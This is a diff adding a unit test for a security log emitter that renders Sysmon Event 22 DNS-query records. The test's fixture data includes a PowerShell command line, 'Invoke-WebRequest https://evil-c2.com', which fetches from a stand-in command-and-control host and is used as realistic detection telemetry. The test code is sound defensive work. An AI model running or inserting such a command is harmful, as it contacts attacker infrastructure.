@@ -1138,6 +1138,46 @@ class TestRenderEvent22:
         assert "1.2.3.4;" in content
         assert "svchost.exe" in content
 
+    def test_dns_query_uses_canonical_initiating_process(self, emitter):
+        """Event 22 should preserve the application that initiated the lookup."""
+        process_start = datetime(2024, 1, 15, 10, 29, 55, tzinfo=UTC)
+        event = SecurityEvent(
+            timestamp=datetime(2024, 1, 15, 10, 30, 0, tzinfo=UTC),
+            event_type="connection",
+            src_host=_win_host(),
+            network=NetworkContext(
+                src_ip="10.0.1.10",
+                dst_ip="10.0.0.1",
+                src_port=49152,
+                dst_port=53,
+                protocol="udp",
+            ),
+            dns=DnsContext(
+                query="evil-c2.com",
+                rcode="NOERROR",
+                answers=["1.2.3.4"],
+                query_process=ProcessContext(
+                    pid=4568,
+                    parent_pid=4000,
+                    image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    command_line="powershell.exe Invoke-WebRequest https://evil-c2.com",
+                    username="alice",
+                    logon_id="0x1a2b3c",
+                    start_time=process_start,
+                ),
+            ),
+        )
+
+        emitter._render_sysmon_dns_query(event)
+        emitter.flush()
+
+        output_path = list(emitter._host_writers.values())[0].output_path
+        content = output_path.read_text()
+        assert '<Data Name="ProcessId">4568</Data>' in content
+        assert '<Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell' in content
+        assert '<Data Name="User">CORP\\alice</Data>' in content
+        assert "LOCAL SERVICE" not in content
+
     def test_dns_query_uses_source_latency_offset(self, emitter):
         """Sysmon Event 22 should not render at the exact Zeek DNS packet timestamp."""
         event_time = datetime(2024, 1, 15, 10, 30, 0, tzinfo=UTC)
